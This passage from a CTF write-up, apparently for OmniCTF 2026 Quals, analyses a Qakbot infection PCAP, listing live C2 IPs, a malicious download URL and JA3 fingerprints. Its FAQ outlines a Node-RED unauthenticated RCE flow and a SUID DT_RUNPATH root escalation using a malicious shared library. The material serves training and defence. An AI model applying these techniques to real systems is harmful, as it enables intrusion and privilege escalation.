## 5. QuackQuackDiriDiriDuck

Forensics. Handout is a Qakbot infection PCAP plus phishing `.eml` samples. Ten sub-question flags on rCTF, each graded separately. The PCAP filename maps directly to Brad Duncan's malware-traffic-analysis.net corpus, whose published notes are the ground-truth IoC list to cross-check every answer against.

### Step 1 — Triage the archive

```
Password: infected
Archive contents:
  Malware/2023-05-24-obama264-Qakbot-infection.pcap (18 MB)
  Malware/MailChalls.zip → Email1..Email5.eml + NoPDFEmail.eml
~/Downloads/Email3.eml (delivered separately)
```

macOS `unzip` can't handle the WinZip AES encryption; use `7z x -pinfected` instead. The filename `2023-05-24-obama264-Qakbot-infection.pcap` is a direct reference to Brad Duncan's [malware-traffic-analysis.net](https://www.malware-traffic-analysis.net/) post for that day; his published notes archive (password `infected_20230524`) contains the definitional IoC list for the OBAMA264 (TA570) QAKBOT distribution tag.

```bash
mkdir -p ~/quack && cd ~/quack
7z x -pinfected ~/Downloads/QuackQuackDiriDiriDuck.zip
7z x Malware/MailChalls.zip
tshark -r Malware/2023-05-24-obama264-Qakbot-infection.pcap \
       --export-objects "http,pcap_objects"
```

The exported HTTP objects include the initial `ewukhyqpjz.zip` (containing `Claim_A615.wsf`, a Windows script padded with ~1,000 lines of Kant's *Critique of Pure Reason* as anti-analysis filler) and the Qakbot DLL `aKUVYL8o0uv.dat` (PE32, MD5 `775988673806d9522b889aa2a09cc05b`).

### Step 2 — Q1: How many emails have malicious PDFs?

```bash
for f in "Emails to give/"*.eml; do
  echo "$f: $(grep -c '^Content-Type: application/pdf' "$f") PDF(s)"
done
```

Email1-Email5 each carry exactly one PDF; `NoPDFEmail.eml` has zero. **Flag: `OmniCTF{5}`**.

### Step 3 — Q3: First malicious HTTP download URL

```bash
tshark -r Malware/2023-05-24-obama264-Qakbot-infection.pcap \
       -Y "http.request" \
       -T fields -e frame.time -e http.host -e http.request.uri | head -1
```

```
2023-05-24T18:34:13.441341+0200  adubuildersco.com  /ewukhyqpjz/ewukhyqpjz.zip
```

**Flag: `OmniCTF{http://adubuildersco.com/ewukhyqpjz/ewukhyqpjz.zip}`**.

### Step 4 — Q4 & Q5: Qakbot TLS C2 fingerprint and endpoints

Every TLS ClientHello in the capture has a JA3/JA4 fingerprint. The obvious cluster is the **no-SNI** ClientHellos — Qakbot's giveaway:

- **JA3**: `43016d7f7f9336b17c884650d0d2545d`
- **JA4**: `t12i180600_4b22cbed5bed_2dae41c691ec` (the `i` marks "no SNI"; a Windows SChannel cipher list without a hostname is a bright red flag for any benign process)

```bash
tshark -r ... -Y "tls.handshake.ja3 == 43016d7f7f9336b17c884650d0d2545d" \
       -T fields -e ip.dst -e tcp.dstport | sort -u
```

Four unique remote endpoints, all completing full TLS handshakes:

| IP:port | Bytes | ServerHellos | Role |
|---|---|---|---|
| `142.118.221.248:2222` | 5.15 MB | 81 | main C2 (long session; chosen after the 188 probe failed) |
| `185.81.114.188:443` | 837 KB | 1 | secondary; self-cert `gifts.com` |
| `188.28.19.84:443` | 3.6 KB | 1 | initial probe; self-cert `xoouxld.net` |
| `201.130.154.90:443` | 14.5 KB | 4 | late-session backup; self-cert `nabislo.org` |

Cross-check with Brad's notes: same four IPs, same roles.

- **Q4 flag: `OmniCTF{4}`**.
- **Q5 flag** (IP-ascending): `OmniCTF{142.118.221.248:2222+185.81.114.188:443+188.28.19.84:443+201.130.154.90:443}`.

### Step 5 — Q6 & Q7: UTC timestamps

The PCAP records local time (CEST, +0200). Convert to UTC — the grader expects UTC, and Brad's notes use UTC throughout.

- ZIP request: `2023-05-24T18:34:13.441341+0200` → `2023-05-24 16:34:13 UTC`. **Flag: `OmniCTF{2023-05-24 16:34:13}`**.
- DLL request: `2023-05-24T18:35:27.396568+0200` → `2023-05-24 16:35:27 UTC`. **Flag: `OmniCTF{2023-05-24 16:35:27}`**.

First attempt used local CEST (`18:34:13`) and was rejected. UTC first on any PCAP forensics question.

### Step 6 — Q8: Seconds between DLL GET and first C2 ClientHello

```
DLL GET (epoch):             1684946127.396568
First C2 ClientHello (JA3):  1684946467.784470  → to 188.28.19.84:443
Delta:                          340.387902 s
```

**Flag: `OmniCTF{340.388}`**.

The "first C2 ClientHello" is specifically the first `t12i...` (no-SNI) handshake. Connectivity checks to `irs.gov` etc. that fire ~1 second earlier use the SNI-present JA3 `6a5d...` and aren't C2.

### Step 7 — Q9 & Q10: Family and campaign

Brad's header spells both in caps:

```
DISTRIBUTION TAG OBAMA264 (TA570) — QAKBOT (QBOT)
```

- **Q9 flag: `OmniCTF{QAKBOT}`**. Case-sensitive: `Qakbot`, `Qbot`, `QakBot` all rejected until I matched Brad's uppercase form.
- **Q10 flag: `OmniCTF{OBAMA264}`**.

### Step 8 — Q2 (unresolved)

Q2 asks for the attacker sender addresses in alphabetical order. The `.example` sanitisation on `From:` / `Return-Path:` / `Sender:` produces multiple defensible sets (2 unique `From:`, 3 real `Sender:`, 5 real `From:` from Brad's originals), and none of the case/sort combinations were accepted. Skipping — needs a hint from the platform on which field and which case convention to use.

Final tally: **9 of 10 sub-flags recovered**.

Per-challenge README + solver: [forensics/quackquackdiridiriduck](https://github.com/Abdelkad3r/OmniCTF-2026-Quals/tree/main/forensics/quackquackdiridiriduck).

Three portable lessons. **The malware-traffic-analysis.net corpus is the definitional IoC source for a huge swathe of CTF PCAP challenges.** Filenames matching the `YYYY-MM-DD-<tag>-<family>-infection.pcap` convention are almost always drawn from Brad's blog; the published notes package (usually password-`infected_YYYYMMDD`) is the ground truth. Any PCAP forensics challenge whose filename matches that convention is one search away from the answer set. **JA3/JA4 no-SNI fingerprints identify Qakbot C2 uniquely.** SChannel-style ClientHellos without SNI to non-standard ports (2222 in this case) don't happen for benign processes. `tshark -Y "tls.handshake.ja3 == <hash>"` clusters the whole C2 conversation in one filter. **Grader case sensitivity + UTC default.** rCTF-style graders are usually case-sensitive on plain-word answers (`QAKBOT` yes, `Qakbot` no), and timestamps default to UTC even when the source PCAP records local time. Try UTC first, match the ground-truth notes' case second.

## Cross-cutting defender notes

Six patterns recur across the OmniCTF 2026 Quals misc + forensics tracks and translate directly into review or triage heuristics.

**When the handout ships infrastructure, use it.** baccarat's `game.py` and agents. Node's `/entrypoint.sh` and SUID binary. nostalgia's `.sb3` archive layout. Sanity P0zzl3's alpha channels. QuackQuackDiriDiriDuck's PCAP filename indexing Brad Duncan's corpus. The "handout is the oracle" pattern shows up on every non-trivial CTF category, from RSA challenges where the generator is in Sage to reversing challenges where the target binary is unstripped. Import the handout, dump its structure, parse it, before writing any solver code from first principles. Half the challenges dissolve the moment you notice what the author gave you.

**Node-RED without `adminAuth` is a shell.** Any exposed Node-RED admin API is RCE, full stop. Exec nodes execute arbitrary shell; function nodes execute arbitrary JavaScript with `functionExternalModules: true` giving arbitrary npm imports. Same class shows up in Grafana without auth (executes arbitrary panel scripts), Jenkins without auth (Groovy console), any headless BI tool with SQL panels. Never rely on network-level ACLs for admin surfaces; require auth inside the app.

**`DT_RUNPATH` combined with a writable directory is a SUID trust delegation.** Both glibc and musl honour `DT_RUNPATH` for setuid binaries (only `LD_LIBRARY_PATH` is scrubbed at setuid dispatch). If the runpath is a world-writable directory (or writable by any lower-privilege user), the setuid bit is effectively delegated to whoever can write there. Audit every setuid binary's `readelf -d` output; if `DT_RUNPATH` or `DT_RPATH` points at a directory outside `/lib`, `/usr/lib`, or a well-guarded application path, it's a privilege boundary. Same class extends to Windows `KnownDLLs` and macOS `@rpath` binaries when the paths are user-writable.

**Container formats hide files behind extensibility slots.** Scratch `.sb3` lists holding a full RISC-V Linux kernel is one example; the general class includes PNG `zTXt`/`iTXt`/`tEXt` chunks, DOCX `customXml/`, MIDI pitch-wheel events, PDF `/Info` dictionaries, and every other "structured container with a stringly-typed metadata slot." Any forensics or reversing engagement on a container format should list its extensibility slots first and check for oversized entries before assuming the payload is in the visible structure.

**Ship a compiler in production containers only if you intend to hand privilege escalation to attackers.** Node's exploit chain closes because the container has `gcc-15.2.0` and musl headers. Without those, an attacker would need to cross-compile a musl-compatible shared object elsewhere and ship it in via the flow, which is still possible but higher friction. Production containers should have no compilers, no interpreters they don't need, no `perl`, no `python3` with dev headers, no `find | xargs`, and no shell utilities beyond what the runtime literally invokes. Every one of those is a rung on someone's post-exploitation ladder.

**PCAP forensics filenames are usually direct index into public IoC corpora.** QuackQuackDiriDiriDuck's PCAP is named `2023-05-24-obama264-Qakbot-infection.pcap` — a filename that matches malware-traffic-analysis.net's convention exactly, and Brad Duncan's published notes for that day are the ground-truth answer set. Any CTF forensics engagement on a PCAP whose filename matches `YYYY-MM-DD-<tag>-<family>-infection.pcap`, `<year>-<n>-<family>.pcap`, or `<CVE>-*.pcap` deserves a search across malware-traffic-analysis.net / Any.Run / VirusTotal / Hybrid Analysis / URLhaus / Malshare corpora before you write your own IoC extractor. Real-world SOC triage runs the same reflex: fingerprint the sample, look it up in your threat-intel feeds, only then dig into per-packet analysis if the ground truth isn't already published.

## Frequently asked questions

### What is OmniCTF 2026 Quals?

OmniCTF 2026 Quals is the qualifier round of the OmniCTF 2026 competition, with challenges spanning web, pwn, reverse, crypto, game, misc, and forensics. Flags use event-specific namespaces (`CTF{...}`, `OMNICTF{...}`, `OmniCTF{...}`, `omniCTF{...}`, `omni{...}`) depending on the challenge author. This writeup covers the four misc challenges I solved (baccarat, Node, nostalgia, Sanity P0zzl3) plus the QuackQuackDiriDiriDuck forensics challenge (Brad Duncan 2023-05-24 obama264 Qakbot infection PCAP, 9 of 10 sub-flags recovered). Paired [web](/ctf-writeups/omnictf-2026-quals-web-writeup/), [pwn](/ctf-writeups/omnictf-2026-quals-pwn-writeup/), [reverse](/ctf-writeups/omnictf-2026-quals-reverse-writeup/), [crypto](/ctf-writeups/omnictf-2026-quals-crypto-writeup/), and [game](/ctf-writeups/omnictf-2026-quals-game-writeup/) writeups on the same site cover the other tracks. Per-challenge READMEs and solvers at [Abdelkad3r/OmniCTF-2026-Quals](https://github.com/Abdelkad3r/OmniCTF-2026-Quals).

### Why does the baccarat challenge use Kelly x2 instead of full Kelly?

Full Kelly (`f* = 2e` for even-money games) maximises log growth per bet. On the baccarat roster the weighted average log growth per bet is ~4.9e-3 nats, so reaching the 100x target from 1000 to 100,000 needs `ln(100) ≈ 4.605` nats or about 940 bets at full Kelly. The 12-round tables plus 180-second client timeout don't accommodate 940 rounds. Over-Kelly trades log growth for reach: Monte-Carlo over 10,000 sessions shows Kelly x1 hits target 1.7% of the time in 171 rounds; Kelly x2 hits 12.9% in 134 rounds; Kelly x5 drops to 5.7% in 44 rounds (too much variance). Kelly x2 sits on a broad plateau. Wrap in a reconnect loop; five attempts get to 50% chance, twenty attempts above 95%.

### How do you identify the weak baccarat agent?

The five agents ship with docstrings that literally announce their strength tier: `omnicybr` is "ideal", `northstar` is "near-ideal", `nipcat` is a "noisy threshold model", `blackshard` is "timid, refuses good draws", and `voltaicai` is "over-draws far past 6". BlackShard is the deliberately weak agent, so every table where BlackShard is on one side has a 5.3-6.7% edge for the other side. Simulate each roster pair for 50k rounds with the handout's own `game.py` to get exact edges, then bet the favoured side every round.

### How does Node's Node-RED unauth RCE flow work?

Node-RED 5.0.1 with no `adminAuth` exposes the admin API on `/`. `POST /flows` accepts a full flow definition; deploy an `http in → exec → change → http response` chain. The `exec` node has a `useSpawn` toggle: `false` uses `child_process.exec(cmd + " " + payload)` which already wraps in `/bin/sh -c "..."`, so setting `command:""` and `addpay:"payload"` gives a clean "whatever I POST is a shell command" primitive. `useSpawn:true` tokenises on whitespace and confuses the argv layout; use `false` for arbitrary shell RCE.

### Why does `DT_RUNPATH` on the SUID `nodestatus` binary give root?

`nodestatus` is SUID root and its ELF has `DT_RUNPATH: /var/lib/node`. Both glibc and musl `ld.so` honour `DT_RUNPATH` for setuid binaries (only `LD_LIBRARY_PATH` and friends are scrubbed at setuid dispatch). The `/entrypoint.sh` does `chmod 0777 /var/lib/node` before dropping privileges to `svc_node`, so any user can write to that directory. Drop a malicious `libshared.so` there, and `nodestatus` loads *your* version on next execution. A `__attribute__((constructor))` in the shared library runs before `main()` and while the effective UID is still 0, giving arbitrary code execution as root.

### How do you compile the malicious shared library in the Node container?

The container has `gcc-15.2.0` and musl headers installed. `gcc -shared -fPIC -o /var/lib/node/libshared.so /tmp/evil.c` produces a musl-linked shared object with correct ABI for the SUID binary. No cross-compilation, no worrying about GLIBC vs. musl symbol versions. Provide `print_banner` and `log_status` as no-op stubs so the loader resolves the symbols `nodestatus` needs, and do the exploit work in a constructor.

### What's inside the nostalgia Scratch `.sb3` file?

`.sb3` is a ZIP. Inside is `project.json` plus media assets. `project.json` has a Scratch list `RISCV.ROM` with 4,263,001 decimal-string byte entries. Reconstructing that as raw bytes gives a bootable RISC-V Linux 6.1.14 kernel (`riscv-minimal-nommu`, BusyBox 1.36.0) with an embedded `newc` cpio initramfs (magic `070701`). The initramfs contains `root/readme.txt`, which has `console.log("OmniCTF{ig_bro_have_some_n0stalgiaaa-676767676789}");` (the flag body).

### How do you parse a `newc` cpio archive?

Every entry starts with 6 bytes of `070701` magic, followed by 13 × 8-byte ASCII-hex fields, then `namesize` bytes of NUL-terminated name (4-byte-aligned), then `filesize` bytes of data (also 4-byte-aligned). Field 6 is `filesize`, field 11 is `namesize`. Iterate: read the 110-byte header, read the name (skip to 4-byte alignment), read the data (skip to 4-byte alignment), stop when you see `TRAILER!!!` as the name.

### How does the Sanity P0zzl3 jigsaw solver work?

100 transparent PNG pieces of a shuffled purple QR code. Recover per-piece boundary curves from alpha (`L[y], R[y], T[x], B[x]`), classify each side as flat/tab/hole from the central-half deviation from the shoulder line (median of the two straight regions at 12-28% and 72-88% of the side length). Model as a 10x10 CP-SAT assignment: 100 variables, `AllDifferent`, border cells constrained to correct flat side, internal seams constrained to tab/hole compatibility, minimise sum of neighbour edge-curve mismatch. OR-Tools solves in ~2.5 minutes. Render, then repair QR modules via purple thresholding + morphological dilate + 17x17 close to bridge seam cuts, then `QRCodeDetector().detectAndDecode()`.

### What's the broader lesson from the OmniCTF 2026 Quals misc + forensics tracks?

*Import the handout, don't rewrite it.* Every challenge in this set ships enough infrastructure that reproducing the exploit from first principles is strictly more work than using what the author already provided. baccarat's `game.py` is a first-class baccarat simulator. Node's `/entrypoint.sh` names the misconfiguration. nostalgia's `.sb3` is a ZIP with the whole RISC-V Linux image inline. Sanity P0zzl3's PNG alpha gives exact piece geometry with no heuristic estimation. QuackQuackDiriDiriDuck's PCAP filename indexes Brad Duncan's malware-traffic-analysis.net corpus, whose published notes are the ground-truth IoC list. Trained triage catalogues what the handout gives before writing solver code.

### How do you identify Qakbot C2 in the QuackQuackDiriDiriDuck PCAP?

Cluster TLS ClientHellos by JA3, then filter for the no-SNI fingerprint `43016d7f7f9336b17c884650d0d2545d` (JA4 `t12i180600_...` where the `i` marks "no SNI"). SChannel-style ClientHellos without SNI to non-standard ports (2222 in this case) don't happen for benign processes. `tshark -Y "tls.handshake.ja3 == 43016d7f7f9336b17c884650d0d2545d" -T fields -e ip.dst -e tcp.dstport | sort -u` clusters the whole C2 conversation in one filter — four unique endpoints, all confirmed against Brad Duncan's published IoC list.

### Why did Q2 (sender addresses alphabetically) fail on QuackQuackDiriDiriDuck?

The `.example` sanitisation on `From:`, `Return-Path:`, and `Sender:` headers in the handout produces multiple defensible sender-address sets (2 unique `From:`, 3 real `Sender:`, 5 real `From:` from Brad's originals), and none of the case/sort combinations were accepted by rCTF. Without a hint on which header field the grader keys off and whether it wants sanitised or de-sanitised forms, the sub-flag is ambiguous. 9 of 10 sub-flags recovered; skipping Q2 was the right call once the obvious permutations exhausted.

### Where can I find the solver scripts?

Per-challenge READMEs, handouts, and solver scripts at [Abdelkad3r/OmniCTF-2026-Quals](https://github.com/Abdelkad3r/OmniCTF-2026-Quals). baccarat, Node, and nostalgia solvers are pure Python stdlib. Sanity P0zzl3 needs `pillow`, `numpy`, `opencv-python`, and `ortools` (`python3 -m pip install pillow numpy opencv-python ortools`). QuackQuackDiriDiriDuck needs `tshark` / Wireshark and `7z` for the WinZip-AES archive. Node's solver deploys the flow, compiles the malicious `.so` in-container, triggers `nodestatus`, and prints the flag end-to-end. All five reproducible against fresh instances / handouts.

## Closing notes

Four misc challenges plus one forensics challenge from very different corners of the platform, one shared discipline: **the handout is the oracle, and importing it beats rewriting it every time**. baccarat's Kelly x2 sizing is a five-line loop over the handout's own `game.py`. Node's SUID `DT_RUNPATH` privesc is a `chmod 0777` in `/entrypoint.sh` plus a two-symbol shared-library stub compiled in-container. nostalgia's flag is one `unzip → json.loads → bytes → strings → cpio parse` chain across four well-known container formats. Sanity P0zzl3's 10x10 assignment is exact CP-SAT input plus a morphological repair pass to close seam cuts in the QR modules. QuackQuackDiriDiriDuck's ten sub-flags are `tshark` object export, no-SNI JA3 clustering, and UTC timestamp reconciliation against Brad Duncan's malware-traffic-analysis.net notes for the same day. In every case the intended path is legible from the handout's structure, not derived from theory.

For the same event's other tracks, the [OmniCTF 2026 Quals web writeup](/ctf-writeups/omnictf-2026-quals-web-writeup/), [OmniCTF 2026 Quals pwn writeup](/ctf-writeups/omnictf-2026-quals-pwn-writeup/), [OmniCTF 2026 Quals reverse writeup](/ctf-writeups/omnictf-2026-quals-reverse-writeup/), [OmniCTF 2026 Quals crypto writeup](/ctf-writeups/omnictf-2026-quals-crypto-writeup/), and [OmniCTF 2026 Quals game writeup](/ctf-writeups/omnictf-2026-quals-game-writeup/) each cover their own set. Adjacent misc + forensics writeups on the site: the [Junior.Crypt 2026 forensic + misc + OSINT writeup](/ctf-writeups/junior-crypt-2026-forensic-misc-osint-writeup/) walks a Krita `.bundle` (PNG-inside-zip-inside-`zTXt`-inside-XML-inside-CDATA) that rhymes with nostalgia's container-nesting discipline, plus a pickle supply-chain backdoor with a `LedgerModel.infer` trigger that rhymes with Node's "handout ships the loader for the exploit." The [BroncoCTF 2026 beginner + forensics + misc writeup](/ctf-writeups/broncoctf-2026-beginner-forensics-misc-writeup/) covers a Bundle 99 six-layer format staircase and a Zip Zip Hooray 1,251-layer archive stack. Full [CTF writeups index](/ctf-writeups/) for the rest.

<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "FAQPage",
  "mainEntity": [
    {"@type": "Question","name": "What is OmniCTF 2026 Quals?","acceptedAnswer": {"@type": "Answer","text": "OmniCTF 2026 Quals is the qualifier round of the OmniCTF 2026 competition, with challenges spanning web, pwn, reverse, crypto, game, misc, and forensics. Flags use event-specific namespaces. This writeup covers the four misc challenges I solved (baccarat, Node, nostalgia, Sanity P0zzl3) plus the QuackQuackDiriDiriDuck forensics challenge (Brad Duncan 2023-05-24 obama264 Qakbot infection PCAP, 9 of 10 sub-flags recovered). Paired web/pwn/reverse/crypto/game writeups on the same site cover the other tracks. Per-challenge READMEs and solvers at github.com/Abdelkad3r/OmniCTF-2026-Quals."}},
    {"@type": "Question","name": "Why does the baccarat challenge use Kelly x2 instead of full Kelly?","acceptedAnswer": {"@type": "Answer","text": "Full Kelly maximises log growth but takes ~940 bets on this roster's ~4.9e-3 nats-per-bet growth to reach the 100x target. The 180-second timeout doesn't accommodate that. Over-Kelly trades log growth for reach: Kelly x1 hits target 1.7% in 171 rounds; Kelly x2 hits 12.9% in 134; Kelly x5 drops to 5.7%. Kelly x2 sits on a broad viable plateau. Wrap in a reconnect loop; five attempts reach 50% chance, twenty attempts above 95%."}},
    {"@type": "Question","name": "How do you identify the weak baccarat agent?","acceptedAnswer": {"@type": "Answer","text": "The five agents ship with docstrings that announce their strength tier. blackshard is 'timid, refuses good draws' (weak), voltaicai is 'over-draws far past 6' (weak), omnicybr is 'ideal' (strong), northstar is 'near-ideal', nipcat is 'noisy threshold'. Every table where blackshard is on one side has 5.3-6.7% edge for the other side. Simulate each roster pair for 50k rounds with the handout's own game.py to get exact edges, then bet the favoured side."}},
    {"@type": "Question","name": "How does Node's Node-RED unauth RCE flow work?","acceptedAnswer": {"@type": "Answer","text": "Node-RED 5.0.1 with no adminAuth exposes the admin API. POST /flows accepts a full flow definition; deploy http in → exec → change → http response. Exec node's useSpawn:false uses child_process.exec(cmd + payload) which wraps in /bin/sh -c, so command:'' + addpay:'payload' gives arbitrary shell RCE via POST /api/x. useSpawn:true tokenises on whitespace and confuses argv, so use false for arbitrary command strings."}},
    {"@type": "Question","name": "Why does DT_RUNPATH on the SUID nodestatus binary give root?","acceptedAnswer": {"@type": "Answer","text": "Both glibc and musl ld.so honour DT_RUNPATH for setuid binaries (only LD_LIBRARY_PATH and friends are scrubbed at setuid dispatch). nodestatus is SUID root with DT_RUNPATH: /var/lib/node. /entrypoint.sh does chmod 0777 /var/lib/node before dropping privileges, so any user can write there. Drop a malicious libshared.so; nodestatus loads it on next execution; an __attribute__((constructor)) runs before main() while effective UID is still 0."}},
    {"@type": "Question","name": "How do you compile the malicious shared library in the Node container?","acceptedAnswer": {"@type": "Answer","text": "The container has gcc-15.2.0 and musl headers installed. gcc -shared -fPIC -o /var/lib/node/libshared.so /tmp/evil.c produces a musl-linked shared object with correct ABI. No cross-compilation, no GLIBC-vs-musl symbol version worries. Provide print_banner and log_status as no-op stubs; do the exploit work in a constructor with setuid(0) + system('cat /root/flag*')."}},
    {"@type": "Question","name": "What's inside the nostalgia Scratch .sb3 file?","acceptedAnswer": {"@type": "Answer","text": ".sb3 is a ZIP. Inside is project.json + media assets. project.json has a Scratch list RISCV.ROM with 4,263,001 decimal-string byte entries. Reconstructing as raw bytes gives a bootable RISC-V Linux 6.1.14 kernel with embedded newc cpio initramfs (magic 070701). Inside the initramfs, root/readme.txt has console.log('OmniCTF{ig_bro_have_some_n0stalgiaaa-676767676789}') which is the flag."}},
    {"@type": "Question","name": "How do you parse a newc cpio archive?","acceptedAnswer": {"@type": "Answer","text": "Every entry starts with 6 bytes of 070701 magic, then 13 × 8-byte ASCII-hex fields, then namesize bytes of NUL-terminated name (4-byte-aligned), then filesize bytes of data (also 4-byte-aligned). Field 6 is filesize, field 11 is namesize. Iterate: read 110-byte header, read name (align to 4), read data (align to 4), stop when name is TRAILER!!!."}},
    {"@type": "Question","name": "How does the Sanity P0zzl3 jigsaw solver work?","acceptedAnswer": {"@type": "Answer","text": "100 transparent PNG pieces. Recover boundary curves from alpha (L[y], R[y], T[x], B[x]), classify each side as flat/tab/hole from the central-half deviation from the shoulder line (median of the two straight regions). Model as CP-SAT: 100 variables, AllDifferent, border cells constrained to correct flat side, internal seams constrained to tab/hole, minimise sum of edge-curve mismatch. OR-Tools solves in ~2.5 min. Render, then repair QR via purple thresholding + dilate + 17x17 close to bridge seam cuts, then QRCodeDetector."}},
    {"@type": "Question","name": "What's the broader lesson from the OmniCTF 2026 Quals misc + forensics tracks?","acceptedAnswer": {"@type": "Answer","text": "Import the handout, don't rewrite it. Every challenge ships enough infrastructure that reproducing the exploit from first principles is strictly more work than using what the author provided. baccarat's game.py is a first-class simulator. Node's /entrypoint.sh names the misconfiguration. nostalgia's .sb3 is a ZIP with the whole RISC-V Linux image inline. Sanity P0zzl3's PNG alpha gives exact piece geometry. QuackQuackDiriDiriDuck's PCAP filename indexes Brad Duncan's malware-traffic-analysis.net corpus, whose published notes are the ground-truth IoC list. Trained triage catalogues what the handout gives before writing solver code."}},
    {"@type": "Question","name": "How do you identify Qakbot C2 in the QuackQuackDiriDiriDuck PCAP?","acceptedAnswer": {"@type": "Answer","text": "Cluster TLS ClientHellos by JA3, then filter for the no-SNI fingerprint 43016d7f7f9336b17c884650d0d2545d (JA4 t12i180600_... where the i marks no SNI). SChannel-style ClientHellos without SNI to non-standard ports (2222 in this case) don't happen for benign processes. tshark -Y 'tls.handshake.ja3 == 43016d7f7f9336b17c884650d0d2545d' -T fields -e ip.dst -e tcp.dstport | sort -u clusters the whole C2 conversation in one filter — four unique endpoints, all confirmed against Brad Duncan's published IoC list."}},
    {"@type": "Question","name": "Why did Q2 (sender addresses alphabetically) fail on QuackQuackDiriDiriDuck?","acceptedAnswer": {"@type": "Answer","text": "The .example sanitisation on From:, Return-Path:, and Sender: headers in the handout produces multiple defensible sender-address sets (2 unique From:, 3 real Sender:, 5 real From: from Brad's originals), and none of the case/sort combinations were accepted by rCTF. Without a hint on which header field the grader keys off and whether it wants sanitised or de-sanitised forms, the sub-flag is ambiguous. 9 of 10 sub-flags recovered; skipping Q2 was the right call once the obvious permutations exhausted."}},
    {"@type": "Question","name": "Where can I find the solver scripts?","acceptedAnswer": {"@type": "Answer","text": "Per-challenge READMEs, handouts, and solver scripts at github.com/Abdelkad3r/OmniCTF-2026-Quals. baccarat, Node, and nostalgia solvers are pure Python stdlib. Sanity P0zzl3 needs pillow, numpy, opencv-python, and ortools. QuackQuackDiriDiriDuck needs tshark / Wireshark and 7z for the WinZip-AES archive. Node's solver deploys the flow, compiles the malicious .so in-container, triggers nodestatus, and prints the flag end-to-end. All five reproducible against fresh instances / handouts."}}
  ]
}
</script>
